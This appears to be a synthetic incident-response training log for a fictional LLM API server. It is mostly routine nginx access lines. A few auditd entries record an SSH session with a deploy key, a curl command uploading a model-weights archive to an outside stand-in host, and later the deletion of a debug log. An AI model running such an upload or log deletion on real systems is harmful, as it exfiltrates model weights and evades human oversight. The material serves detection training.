# ApexAI synthetic incident-response training data; all identities and addresses are fictional.
2026-07-14T10:23:38.243Z host=llm-api component=nginx request_id=req-390c2080eab3 remote=192.0.2.52 method=GET path="/v1/health" status=200 bytes=38764 latency_ms=2214 ua="Mozilla/5.0"
2026-07-14T10:24:30.817Z host=llm-api component=nginx request_id=req-2be404d7f0c2 remote=203.0.113.19 method=POST path="/v1/health" status=429 bytes=9683 latency_ms=7402 ua="apex-monitor/2.1"
2026-07-14T10:25:20.077Z host=llm-api component=nginx request_id=req-f2c959379c34 remote=172.16.1.2 method=GET path="/v1/embeddings" status=200 bytes=101633 latency_ms=3915 ua="apex-monitor/2.1"
2026-07-14T10:27:15.468Z host=llm-api component=nginx request_id=req-7ade62e70af0 remote=192.0.2.52 method=POST path="/v1/chat/completions" status=200 bytes=13124 latency_ms=1397 ua="apex-web/4.8.2"
2026-07-14T10:29:04.857Z host=llm-api component=nginx request_id=req-6a0598f8f61b remote=172.16.2.12 method=GET path="/v1/embeddings" status=200 bytes=91700 latency_ms=3859 ua="python-httpx/0.27"
2026-07-14T10:29:04.983Z host=llm-api component=nginx request_id=req-11723c8c21aa remote=203.0.113.19 method=GET path="/v1/models" status=200 bytes=6272 latency_ms=3852 ua="apex-web/4.8.2"
2026-07-14T10:30:46.237Z host=llm-api component=nginx request_id=req-1db86226e2a6 remote=172.16.1.2 method=GET path="/v1/models" status=200 bytes=104212 latency_ms=7247 ua="python-httpx/0.27"
2026-07-14T10:31:08.001Z host=llm-api component=auditd type=EXECVE uid=991 exe=/usr/bin/ssh argc=6 a0=ssh a1=-i a2=/opt/apex/.ssh/eng_deploy a3=deploybot@172.16.2.12 a4=-p a5=22 pid=30119
2026-07-14T10:31:50.907Z host=llm-api component=nginx request_id=req-332d3fb88b6e remote=172.16.2.12 method=GET path="/v1/chat/completions" status=200 bytes=8398 latency_ms=1970 ua="curl/8.4.0"
2026-07-14T10:33:22.663Z host=llm-api component=nginx request_id=req-4d0d372e5f39 remote=192.0.2.52 method=GET path="/v1/chat/completions" status=200 bytes=44587 latency_ms=4097 ua="apex-web/4.8.2"
2026-07-14T10:33:59.366Z host=llm-api component=nginx request_id=req-a999931882b6 remote=192.0.2.52 method=POST path="/v1/models" status=200 bytes=9691 latency_ms=481 ua="apex-web/4.8.2"
2026-07-14T10:34:25.293Z host=llm-api component=nginx request_id=req-00f033a0d777 remote=192.0.2.52 method=GET path="/v1/models" status=200 bytes=13842 latency_ms=6227 ua="Mozilla/5.0"
2026-07-14T10:35:58.861Z host=llm-api component=nginx request_id=req-f3ba45ae4e05 remote=172.16.1.2 method=GET path="/v1/chat/completions" status=200 bytes=11094 latency_ms=5554 ua="python-httpx/0.27"
2026-07-14T10:36:28.156Z host=llm-api component=nginx request_id=req-f46bf5a4cdf2 remote=172.16.3.10 method=GET path="/robots.txt" status=200 bytes=34473 latency_ms=4472 ua="Mozilla/5.0"
2026-07-14T10:37:57.142Z host=llm-api component=nginx request_id=req-a5f3152eb84f remote=172.16.2.12 method=GET path="/v1/health" status=200 bytes=114643 latency_ms=1756 ua="Mozilla/5.0"
2026-07-14T10:38:09.588Z host=llm-api component=nginx request_id=req-1cdc8a41112f remote=172.16.3.10 method=GET path="/v1/health" status=200 bytes=49687 latency_ms=3510 ua="python-httpx/0.27"
2026-07-14T10:38:55.500Z host=llm-api component=nginx request_id=req-9d5eb3908e4a remote=172.16.3.10 method=GET path="/v1/embeddings" status=200 bytes=97032 latency_ms=4457 ua="apex-web/4.8.2"
2026-07-14T10:39:13.485Z host=llm-api component=nginx request_id=req-4929bd358728 remote=172.16.2.12 method=POST path="/v1/embeddings" status=200 bytes=69101 latency_ms=6351 ua="curl/8.4.0"
2026-07-14T10:41:06.776Z host=llm-api component=nginx request_id=req-54c68ccf6714 remote=172.16.3.10 method=GET path="/v1/health" status=500 bytes=28249 latency_ms=7134 ua="apex-monitor/2.1"
2026-07-14T10:42:10.513Z host=llm-api component=nginx request_id=req-65c2958b2d22 remote=172.16.3.10 method=POST path="/v1/chat/completions" status=200 bytes=81678 latency_ms=4804 ua="apex-web/4.8.2"
2026-07-14T10:42:34.458Z host=llm-api component=nginx request_id=req-7e7b0c491821 remote=172.16.3.10 method=GET path="/metrics" status=200 bytes=39341 latency_ms=5371 ua="apex-web/4.8.2"
2026-07-14T10:43:16.827Z host=llm-api component=nginx request_id=req-01d15990ac59 remote=203.0.113.19 method=GET path="/metrics" status=200 bytes=111994 latency_ms=1416 ua="apex-monitor/2.1"
2026-07-14T10:45:34.775Z host=llm-api component=nginx request_id=req-02f3bf5c6c49 remote=172.16.1.2 method=GET path="/v1/chat/completions" status=200 bytes=54344 latency_ms=677 ua="curl/8.4.0"
2026-07-14T10:48:54.883Z host=llm-api component=nginx request_id=req-e682bcb544bc remote=172.16.3.10 method=GET path="/v1/models" status=200 bytes=13895 latency_ms=1528 ua="python-httpx/0.27"
2026-07-14T10:49:00.076Z host=llm-api component=nginx request_id=req-e20b60d38793 remote=172.16.3.10 method=GET path="/v1/embeddings" status=200 bytes=112015 latency_ms=166 ua="curl/8.4.0"
2026-07-14T10:49:59.734Z host=llm-api component=nginx request_id=req-770868a2153e remote=172.16.2.12 method=GET path="/v1/embeddings" status=200 bytes=31650 latency_ms=770 ua="apex-web/4.8.2"
2026-07-14T10:53:57.320Z host=llm-api component=nginx request_id=req-81ad8adfb9c8 remote=172.16.2.12 method=GET path="/v1/embeddings" status=401 bytes=48954 latency_ms=1429 ua="apex-monitor/2.1"
2026-07-14T10:53:58.834Z host=llm-api component=nginx request_id=req-481fd66ca5a1 remote=172.16.3.10 method=GET path="/v1/embeddings" status=200 bytes=2361 latency_ms=2566 ua="apex-monitor/2.1"
2026-07-14T10:54:40.258Z host=llm-api component=nginx request_id=req-80f66c1852e8 remote=192.0.2.52 method=POST path="/robots.txt" status=200 bytes=6249 latency_ms=3227 ua="apex-monitor/2.1"
2026-07-14T10:54:49.378Z host=llm-api component=nginx request_id=req-645d3fd5ade2 remote=172.16.3.10 method=POST path="/robots.txt" status=200 bytes=2446 latency_ms=4799 ua="apex-monitor/2.1"
2026-07-14T10:55:08.554Z host=llm-api component=nginx request_id=req-66500ea74d18 remote=172.16.3.10 method=POST path="/v1/chat/completions" status=200 bytes=95971 latency_ms=5697 ua="curl/8.4.0"
2026-07-14T10:55:17.614Z host=llm-api component=nginx request_id=req-8142ef0a3c56 remote=172.16.2.12 method=POST path="/v1/models" status=200 bytes=55585 latency_ms=11 ua="curl/8.4.0"
2026-07-14T10:55:18.557Z host=llm-api component=nginx request_id=req-e6c24ea6bab6 remote=203.0.113.19 method=GET path="/v1/chat/completions" status=200 bytes=53122 latency_ms=7192 ua="Mozilla/5.0"
2026-07-14T10:55:57.494Z host=llm-api component=nginx request_id=req-539780f9a4a8 remote=172.16.3.10 method=GET path="/metrics" status=429 bytes=73309 latency_ms=4625 ua="python-httpx/0.27"
2026-07-14T10:56:16.984Z host=llm-api component=nginx request_id=req-21991e5aec61 remote=172.16.3.10 method=POST path="/v1/chat/completions" status=500 bytes=34271 latency_ms=2521 ua="Mozilla/5.0"
2026-07-14T10:57:12.810Z host=llm-api component=nginx request_id=req-43c0559d27d4 remote=203.0.113.19 method=GET path="/metrics" status=200 bytes=96718 latency_ms=7117 ua="Mozilla/5.0"
2026-07-14T10:57:34.184Z host=llm-api component=nginx request_id=req-a4f0d970ca26 remote=172.16.3.10 method=GET path="/metrics" status=200 bytes=77643 latency_ms=1098 ua="apex-monitor/2.1"
2026-07-14T10:58:25.856Z host=llm-api component=nginx request_id=req-b64612ee6ed0 remote=192.0.2.52 method=GET path="/v1/embeddings" status=200 bytes=111687 latency_ms=2303 ua="python-httpx/0.27"
2026-07-14T10:58:26.864Z host=llm-api component=nginx request_id=req-2401f0c9627d remote=192.0.2.52 method=GET path="/v1/embeddings" status=200 bytes=114720 latency_ms=3999 ua="Mozilla/5.0"
2026-07-14T11:00:15.585Z host=llm-api component=nginx request_id=req-7a2499fefae0 remote=172.16.1.2 method=GET path="/v1/health" status=201 bytes=17834 latency_ms=7722 ua="apex-monitor/2.1"
2026-07-14T11:00:51.814Z host=llm-api component=nginx request_id=req-4f17bf412344 remote=172.16.3.10 method=GET path="/metrics" status=200 bytes=93223 latency_ms=1986 ua="python-httpx/0.27"
2026-07-14T11:01:26.864Z host=llm-api component=nginx request_id=req-c8c49f8a47fe remote=192.0.2.52 method=POST path="/robots.txt" status=200 bytes=104698 latency_ms=6686 ua="apex-web/4.8.2"
2026-07-14T11:01:31.785Z host=llm-api component=nginx request_id=req-ded1226ed41e remote=172.16.3.10 method=POST path="/robots.txt" status=400 bytes=71396 latency_ms=4234 ua="apex-web/4.8.2"
2026-07-14T11:01:33.711Z host=llm-api component=nginx request_id=req-f8a54eaa9b8d remote=172.16.3.10 method=GET path="/metrics" status=401 bytes=31170 latency_ms=2510 ua="Mozilla/5.0"
2026-07-14T11:02:12.798Z host=llm-api component=nginx request_id=req-01e4b1a9d8a9 remote=172.16.3.10 method=GET path="/v1/health" status=200 bytes=93402 latency_ms=512 ua="python-httpx/0.27"
2026-07-14T11:03:05.610Z host=llm-api component=nginx request_id=req-b867a319c421 remote=172.16.1.2 method=GET path="/v1/health" status=400 bytes=66286 latency_ms=4799 ua="curl/8.4.0"
2026-07-14T11:05:46.350Z host=llm-api component=nginx request_id=req-4aeb63f82b77 remote=172.16.1.2 method=GET path="/v1/health" status=200 bytes=93105 latency_ms=6430 ua="python-httpx/0.27"
2026-07-14T11:06:09.810Z host=llm-api component=nginx request_id=req-1a4131bdfa33 remote=172.16.3.10 method=GET path="/v1/health" status=200 bytes=74769 latency_ms=7442 ua="apex-web/4.8.2"
2026-07-14T11:06:43.242Z host=llm-api component=nginx request_id=req-2c475ba962a2 remote=172.16.3.10 method=POST path="/robots.txt" status=429 bytes=77299 latency_ms=4256 ua="Mozilla/5.0"
2026-07-14T11:07:02.693Z host=llm-api component=nginx request_id=req-1dc365fef779 remote=172.16.2.12 method=GET path="/v1/chat/completions" status=200 bytes=75552 latency_ms=3818 ua="python-httpx/0.27"
2026-07-14T11:08:39.564Z host=llm-api component=nginx request_id=req-0a2456c8ce19 remote=172.16.3.10 method=GET path="/v1/chat/completions" status=200 bytes=44855 latency_ms=2819 ua="Mozilla/5.0"
2026-07-14T11:08:44.077Z host=llm-api component=nginx request_id=req-a019231afa28 remote=203.0.113.19 method=GET path="/v1/embeddings" status=500 bytes=53495 latency_ms=1870 ua="python-httpx/0.27"
2026-07-14T11:09:28.935Z host=llm-api component=nginx request_id=req-b3a506d8115e remote=172.16.1.2 method=GET path="/v1/models" status=200 bytes=11174 latency_ms=962 ua="apex-web/4.8.2"
2026-07-14T11:11:15.991Z host=llm-api component=nginx request_id=req-aea1ac266643 remote=192.0.2.52 method=GET path="/v1/chat/completions" status=200 bytes=108083 latency_ms=5686 ua="python-httpx/0.27"
2026-07-14T11:12:10.988Z host=llm-api component=nginx request_id=req-3abf668029bc remote=172.16.1.2 method=GET path="/metrics" status=200 bytes=92361 latency_ms=6844 ua="curl/8.4.0"
2026-07-14T11:12:19.506Z host=llm-api component=nginx request_id=req-18cbf1ce8787 remote=203.0.113.19 method=POST path="/metrics" status=200 bytes=119012 latency_ms=4631 ua="python-httpx/0.27"
2026-07-14T11:12:45.619Z host=llm-api component=nginx request_id=req-548661dc244f remote=192.0.2.52 method=GET path="/v1/health" status=400 bytes=37500 latency_ms=6553 ua="python-httpx/0.27"
2026-07-14T11:13:13.198Z host=llm-api component=nginx request_id=req-f5ac57fc06bd remote=192.0.2.52 method=POST path="/v1/chat/completions" status=401 bytes=78469 latency_ms=5221 ua="curl/8.4.0"
2026-07-14T11:13:22.155Z host=llm-api component=nginx request_id=req-89baf644df9e remote=192.0.2.52 method=POST path="/robots.txt" status=200 bytes=84411 latency_ms=4366 ua="apex-web/4.8.2"
2026-07-14T11:13:46.122Z host=llm-api component=nginx request_id=req-e56c54389b93 remote=192.0.2.52 method=GET path="/v1/embeddings" status=400 bytes=55348 latency_ms=5860 ua="curl/8.4.0"
2026-07-14T11:14:34.639Z host=llm-api component=nginx request_id=req-952dd830084a remote=172.16.1.2 method=GET path="/robots.txt" status=200 bytes=78223 latency_ms=1688 ua="apex-web/4.8.2"
2026-07-14T11:16:08.449Z host=llm-api component=nginx request_id=req-634d24590578 remote=192.0.2.52 method=GET path="/v1/models" status=200 bytes=21970 latency_ms=4558 ua="curl/8.4.0"
2026-07-14T11:18:30.953Z host=llm-api component=nginx request_id=req-683c9a7e72a2 remote=172.16.2.12 method=GET path="/v1/health" status=200 bytes=63715 latency_ms=2596 ua="Mozilla/5.0"
2026-07-14T11:19:05.446Z host=llm-api component=nginx request_id=req-0df57d8b5713 remote=203.0.113.19 method=GET path="/v1/models" status=200 bytes=111751 latency_ms=412 ua="apex-web/4.8.2"
2026-07-14T11:19:55.217Z host=llm-api component=nginx request_id=req-314ee4127b36 remote=192.0.2.52 method=GET path="/metrics" status=200 bytes=47052 latency_ms=5099 ua="apex-web/4.8.2"
2026-07-14T11:22:46.245Z host=llm-api component=nginx request_id=req-4fa6e3374093 remote=172.16.1.2 method=GET path="/v1/chat/completions" status=200 bytes=67417 latency_ms=4794 ua="apex-monitor/2.1"
2026-07-14T11:23:20.655Z host=llm-api component=nginx request_id=req-2f0cdb994cf1 remote=192.0.2.52 method=GET path="/v1/models" status=401 bytes=105757 latency_ms=5745 ua="apex-web/4.8.2"
2026-07-14T11:26:13.174Z host=llm-api component=nginx request_id=req-ce8721246f28 remote=192.0.2.52 method=GET path="/v1/embeddings" status=429 bytes=85615 latency_ms=5557 ua="curl/8.4.0"
2026-07-14T11:28:03.689Z host=llm-api component=nginx request_id=req-4410152ce528 remote=203.0.113.19 method=GET path="/v1/chat/completions" status=200 bytes=91022 latency_ms=6990 ua="python-httpx/0.27"
2026-07-14T11:29:14.368Z host=llm-api component=nginx request_id=req-f94bdf7728ac remote=172.16.3.10 method=POST path="/v1/health" status=500 bytes=55919 latency_ms=6875 ua="Mozilla/5.0"
2026-07-14T11:30:04.714Z host=llm-api component=nginx request_id=req-a7c31352b0b7 remote=192.0.2.52 method=GET path="/robots.txt" status=200 bytes=30548 latency_ms=3224 ua="apex-monitor/2.1"
2026-07-14T11:31:13.470Z host=llm-api component=nginx request_id=req-4377da203c3a remote=172.16.2.12 method=GET path="/metrics" status=200 bytes=19795 latency_ms=5533 ua="Mozilla/5.0"
2026-07-14T11:37:17.715Z host=llm-api component=nginx request_id=req-7758a9f053fb remote=172.16.1.2 method=GET path="/v1/health" status=200 bytes=82404 latency_ms=6384 ua="curl/8.4.0"
2026-07-14T11:37:37.803Z host=llm-api component=nginx request_id=req-6f083730f231 remote=172.16.2.12 method=POST path="/robots.txt" status=400 bytes=94952 latency_ms=1599 ua="python-httpx/0.27"
2026-07-14T11:38:15.626Z host=llm-api component=nginx request_id=req-c34ddc774316 remote=172.16.1.2 method=GET path="/v1/chat/completions" status=201 bytes=53258 latency_ms=562 ua="apex-web/4.8.2"
2026-07-14T11:40:11.769Z host=llm-api component=nginx request_id=req-1fbe5fdb9d82 remote=172.16.3.10 method=POST path="/v1/chat/completions" status=200 bytes=15127 latency_ms=5691 ua="curl/8.4.0"
2026-07-14T11:41:37.074Z host=llm-api component=nginx request_id=req-72d05bb1917c remote=192.0.2.52 method=GET path="/metrics" status=500 bytes=19289 latency_ms=335 ua="curl/8.4.0"
2026-07-14T11:42:28.128Z host=llm-api component=nginx request_id=req-cdf0728828be remote=172.16.2.12 method=GET path="/v1/models" status=200 bytes=13128 latency_ms=6023 ua="Mozilla/5.0"
2026-07-14T11:42:31.480Z host=llm-api component=nginx request_id=req-fc0c8d54091c remote=172.16.2.12 method=GET path="/v1/chat/completions" status=200 bytes=89633 latency_ms=115 ua="apex-web/4.8.2"
2026-07-14T11:44:03.959Z host=llm-api component=nginx request_id=req-1368da4825a4 remote=172.16.1.2 method=GET path="/v1/chat/completions" status=200 bytes=77075 latency_ms=1632 ua="Mozilla/5.0"
2026-07-14T11:44:55.027Z host=llm-api component=nginx request_id=req-d7033d1151c6 remote=172.16.2.12 method=GET path="/metrics" status=200 bytes=103646 latency_ms=3021 ua="apex-monitor/2.1"
2026-07-14T11:45:07.416Z host=llm-api component=nginx request_id=req-f493a3061261 remote=172.16.3.10 method=GET path="/metrics" status=200 bytes=87264 latency_ms=4802 ua="curl/8.4.0"
2026-07-14T11:46:44.537Z host=llm-api component=nginx request_id=req-a9532feced9c remote=172.16.2.12 method=GET path="/v1/health" status=200 bytes=96495 latency_ms=8 ua="curl/8.4.0"
2026-07-14T11:50:37.488Z host=llm-api component=nginx request_id=req-ffe6c205efb8 remote=192.0.2.52 method=POST path="/robots.txt" status=200 bytes=36741 latency_ms=7151 ua="apex-monitor/2.1"
2026-07-14T11:53:16.230Z host=llm-api component=nginx request_id=req-e716c2c48be8 remote=172.16.3.10 method=POST path="/v1/chat/completions" status=200 bytes=70531 latency_ms=5304 ua="python-httpx/0.27"
2026-07-14T11:53:40.690Z host=llm-api component=nginx request_id=req-eb9142381345 remote=192.0.2.52 method=GET path="/v1/chat/completions" status=200 bytes=58629 latency_ms=345 ua="curl/8.4.0"
2026-07-14T11:54:42.047Z host=llm-api component=nginx request_id=req-8d025ea000ca remote=192.0.2.52 method=GET path="/v1/chat/completions" status=201 bytes=41818 latency_ms=7599 ua="apex-monitor/2.1"
2026-07-14T11:55:57.439Z host=llm-api component=nginx request_id=req-f5adc1510aaa remote=172.16.2.12 method=GET path="/v1/models" status=200 bytes=46351 latency_ms=5779 ua="Mozilla/5.0"
2026-07-14T11:56:27.731Z host=llm-api component=nginx request_id=req-d830b174feff remote=172.16.2.12 method=POST path="/metrics" status=400 bytes=20735 latency_ms=7202 ua="Mozilla/5.0"
2026-07-14T11:57:03.435Z host=llm-api component=nginx request_id=req-8b833da94707 remote=172.16.2.12 method=GET path="/v1/health" status=200 bytes=103209 latency_ms=4265 ua="python-httpx/0.27"
2026-07-14T11:57:03.858Z host=llm-api component=nginx request_id=req-2101e1b13816 remote=172.16.3.10 method=GET path="/v1/health" status=200 bytes=90045 latency_ms=6496 ua="apex-web/4.8.2"
2026-07-14T11:59:10.449Z host=llm-api component=nginx request_id=req-436d7939967c remote=172.16.2.12 method=GET path="/v1/chat/completions" status=400 bytes=8313 latency_ms=6618 ua="apex-monitor/2.1"
2026-07-14T11:59:24.584Z host=llm-api component=nginx request_id=req-3e385fcf9e46 remote=172.16.1.2 method=GET path="/v1/health" status=200 bytes=75788 latency_ms=7800 ua="curl/8.4.0"
2026-07-14T11:59:43.471Z host=llm-api component=nginx request_id=req-76ab2c987bf5 remote=192.0.2.52 method=POST path="/v1/chat/completions" status=200 bytes=43144 latency_ms=6917 ua="python-httpx/0.27"
2026-07-14T12:00:05.050Z host=llm-api component=nginx request_id=req-f212bae5a568 remote=203.0.113.19 method=GET path="/robots.txt" status=200 bytes=101060 latency_ms=1950 ua="apex-monitor/2.1"
2026-07-14T12:05:40.032Z host=llm-api component=nginx request_id=req-07e8cd347ce5 remote=192.0.2.52 method=GET path="/v1/chat/completions" status=500 bytes=34828 latency_ms=6904 ua="Mozilla/5.0"
2026-07-14T12:06:50.880Z host=llm-api component=auditd type=EXECVE uid=991 exe=/usr/bin/curl argc=7 a0=curl a1=--retry a2=5 a3=--upload-file a4=/var/tmp/.model-cache/weights_0714.tgz a5=https://cdn-cache.example/upload/7f31 dst=203.0.113.44:443 pid=32041
2026-07-14T12:07:16.319Z host=llm-api component=nginx request_id=req-a759de37dc40 remote=192.0.2.52 method=GET path="/metrics" status=201 bytes=85065 latency_ms=2279 ua="apex-monitor/2.1"
2026-07-14T12:09:27.898Z host=llm-api component=nginx request_id=req-5d39b24b252a remote=172.16.2.12 method=GET path="/metrics" status=200 bytes=110452 latency_ms=3373 ua="apex-monitor/2.1"
2026-07-14T12:09:42.753Z host=llm-api component=nginx request_id=req-2dad8a8855bd remote=203.0.113.19 method=GET path="/robots.txt" status=200 bytes=67592 latency_ms=2136 ua="python-httpx/0.27"
2026-07-14T12:10:37.455Z host=llm-api component=nginx request_id=req-3f006e93d61d remote=172.16.2.12 method=GET path="/v1/health" status=200 bytes=106452 latency_ms=3063 ua="python-httpx/0.27"
2026-07-14T12:10:46.692Z host=llm-api component=nginx request_id=req-e4e2c6d5a368 remote=172.16.2.12 method=GET path="/v1/embeddings" status=200 bytes=117595 latency_ms=6703 ua="apex-monitor/2.1"
2026-07-14T12:11:27.248Z host=llm-api component=nginx request_id=req-b41ab4ca8486 remote=172.16.1.2 method=GET path="/robots.txt" status=400 bytes=104857 latency_ms=3611 ua="Mozilla/5.0"
2026-07-14T12:11:29.237Z host=llm-api component=nginx request_id=req-9b00dfe002d5 remote=172.16.2.12 method=GET path="/metrics" status=200 bytes=2537 latency_ms=1605 ua="curl/8.4.0"
2026-07-14T12:13:07.360Z host=llm-api component=nginx request_id=req-620e2fdd3f12 remote=172.16.2.12 method=GET path="/metrics" status=200 bytes=86834 latency_ms=6863 ua="apex-web/4.8.2"
2026-07-14T12:14:00.781Z host=llm-api component=nginx request_id=req-7cf15b1c09be remote=192.0.2.52 method=POST path="/v1/embeddings" status=429 bytes=100916 latency_ms=1381 ua="Mozilla/5.0"
2026-07-14T12:14:46.980Z host=llm-api component=nginx request_id=req-bc2d33c3f2cc remote=172.16.3.10 method=GET path="/v1/embeddings" status=200 bytes=13098 latency_ms=7706 ua="curl/8.4.0"
2026-07-14T12:14:59.458Z host=llm-api component=nginx request_id=req-ecc1e30014b4 remote=172.16.2.12 method=GET path="/v1/embeddings" status=200 bytes=83667 latency_ms=564 ua="python-httpx/0.27"
2026-07-14T12:15:54.726Z host=llm-api component=nginx request_id=req-52349965b9d0 remote=172.16.2.12 method=GET path="/v1/embeddings" status=200 bytes=31678 latency_ms=784 ua="apex-web/4.8.2"
2026-07-14T12:18:08.493Z host=llm-api component=nginx request_id=req-a0b7be03c97d remote=172.16.1.2 method=GET path="/v1/chat/completions" status=200 bytes=35793 latency_ms=7513 ua="python-httpx/0.27"
2026-07-14T12:18:12.665Z host=llm-api component=nginx request_id=req-32ba28492ebd remote=192.0.2.52 method=GET path="/v1/health" status=200 bytes=100184 latency_ms=6575 ua="curl/8.4.0"
2026-07-14T12:19:39.146Z host=llm-api component=nginx request_id=req-cd87ec7755fd remote=172.16.1.2 method=GET path="/v1/models" status=200 bytes=45489 latency_ms=2967 ua="apex-web/4.8.2"
2026-07-14T12:21:51.597Z host=llm-api component=nginx request_id=req-63fe40e8005d remote=172.16.2.12 method=GET path="/v1/health" status=200 bytes=84618 latency_ms=5158 ua="curl/8.4.0"
2026-07-14T12:28:25.500Z host=llm-api component=nginx request_id=req-082672ffce84 remote=192.0.2.52 method=GET path="/v1/models" status=200 bytes=113670 latency_ms=3500 ua="curl/8.4.0"
2026-07-14T12:28:47.732Z host=llm-api component=nginx request_id=req-236a54bd2070 remote=172.16.3.10 method=POST path="/v1/chat/completions" status=200 bytes=60394 latency_ms=4091 ua="Mozilla/5.0"
2026-07-14T12:28:56.029Z host=llm-api component=nginx request_id=req-0637a930e61a remote=203.0.113.19 method=GET path="/v1/chat/completions" status=200 bytes=87910 latency_ms=7459 ua="curl/8.4.0"
2026-07-14T12:29:47.821Z host=llm-api component=nginx request_id=req-b04aa1aa9259 remote=192.0.2.52 method=GET path="/v1/models" status=429 bytes=86064 latency_ms=6344 ua="Mozilla/5.0"
2026-07-14T12:31:04.536Z host=llm-api component=nginx request_id=req-2f65422d4c0f remote=172.16.3.10 method=GET path="/v1/chat/completions" status=200 bytes=84841 latency_ms=5446 ua="apex-monitor/2.1"
2026-07-14T12:31:08.150Z host=llm-api component=nginx request_id=req-8646e9f51b1a remote=203.0.113.19 method=POST path="/robots.txt" status=200 bytes=25044 latency_ms=6271 ua="Mozilla/5.0"
2026-07-14T12:31:09.280Z host=llm-api component=nginx request_id=req-1b1af0beec72 remote=203.0.113.19 method=GET path="/v1/embeddings" status=200 bytes=101669 latency_ms=1948 ua="curl/8.4.0"
2026-07-14T12:31:15.011Z host=llm-api component=nginx request_id=req-5790eb937c42 remote=192.0.2.52 method=GET path="/metrics" status=429 bytes=57113 latency_ms=4011 ua="Mozilla/5.0"
2026-07-14T12:34:18.209Z host=llm-api component=nginx request_id=req-5c03a911d703 remote=172.16.2.12 method=GET path="/v1/embeddings" status=200 bytes=26288 latency_ms=5726 ua="apex-monitor/2.1"
2026-07-14T12:35:38.679Z host=llm-api component=nginx request_id=req-069dd3ae1099 remote=172.16.1.2 method=GET path="/v1/health" status=200 bytes=39776 latency_ms=341 ua="curl/8.4.0"
2026-07-14T12:36:24.621Z host=llm-api component=nginx request_id=req-0fa7c9cb9975 remote=192.0.2.52 method=POST path="/v1/embeddings" status=200 bytes=47773 latency_ms=1309 ua="Mozilla/5.0"
2026-07-14T12:37:36.297Z host=llm-api component=nginx request_id=req-f696f3582290 remote=172.16.3.10 method=GET path="/v1/health" status=400 bytes=48495 latency_ms=2512 ua="Mozilla/5.0"
2026-07-14T12:38:38.639Z host=llm-api component=nginx request_id=req-479132cd7483 remote=172.16.2.12 method=POST path="/v1/health" status=404 bytes=30156 latency_ms=7726 ua="Mozilla/5.0"
2026-07-14T12:41:50.761Z host=llm-api component=nginx request_id=req-9276bf2d2bb7 remote=172.16.2.12 method=POST path="/v1/models" status=200 bytes=71729 latency_ms=1455 ua="python-httpx/0.27"
2026-07-14T12:44:20.497Z host=llm-api component=nginx request_id=req-69aaf4cba819 remote=172.16.3.10 method=GET path="/v1/chat/completions" status=400 bytes=96481 latency_ms=3676 ua="apex-web/4.8.2"
2026-07-14T12:46:37.933Z host=llm-api component=nginx request_id=req-34332a38fb44 remote=172.16.3.10 method=GET path="/metrics" status=200 bytes=17888 latency_ms=7469 ua="apex-web/4.8.2"
2026-07-14T12:50:20.543Z host=llm-api component=nginx request_id=req-257ea63a6a6a remote=192.0.2.52 method=POST path="/v1/embeddings" status=200 bytes=62486 latency_ms=3253 ua="python-httpx/0.27"
2026-07-14T12:54:59.169Z host=llm-api component=nginx request_id=req-15f138e52baf remote=203.0.113.19 method=GET path="/metrics" status=200 bytes=43707 latency_ms=5156 ua="apex-monitor/2.1"
2026-07-14T12:55:19.423Z host=llm-api component=nginx request_id=req-107c668f7947 remote=172.16.1.2 method=GET path="/v1/models" status=200 bytes=75462 latency_ms=6477 ua="Mozilla/5.0"
2026-07-14T12:56:20.939Z host=llm-api component=nginx request_id=req-87b7e2602f78 remote=203.0.113.19 method=POST path="/metrics" status=200 bytes=28307 latency_ms=6569 ua="apex-monitor/2.1"
2026-07-14T12:56:32.423Z host=llm-api component=nginx request_id=req-b897d77538fa remote=172.16.3.10 method=GET path="/v1/health" status=200 bytes=110907 latency_ms=4988 ua="Mozilla/5.0"
2026-07-14T12:57:14.201Z host=llm-api component=auditd type=SYSCALL uid=991 exe=/usr/bin/sh syscall=unlink success=yes target=/var/log/apexserve/debug.log
2026-07-14T12:58:13.979Z host=llm-api component=nginx request_id=req-edaad192a778 remote=172.16.2.12 method=GET path="/metrics" status=200 bytes=104098 latency_ms=3074 ua="Mozilla/5.0"
2026-07-14T12:58:38.595Z host=llm-api component=nginx request_id=req-86de294aabf1 remote=172.16.1.2 method=GET path="/v1/models" status=200 bytes=105010 latency_ms=5037 ua="apex-monitor/2.1"
2026-07-14T12:59:36.971Z host=llm-api component=nginx request_id=req-05c0868c3c4c remote=172.16.3.10 method=GET path="/metrics" status=200 bytes=1898 latency_ms=3326 ua="apex-web/4.8.2"
2026-07-14T13:01:06.513Z host=llm-api component=nginx request_id=req-d1c8f49b1c89 remote=172.16.1.2 method=POST path="/v1/embeddings" status=200 bytes=101406 latency_ms=89 ua="apex-web/4.8.2"
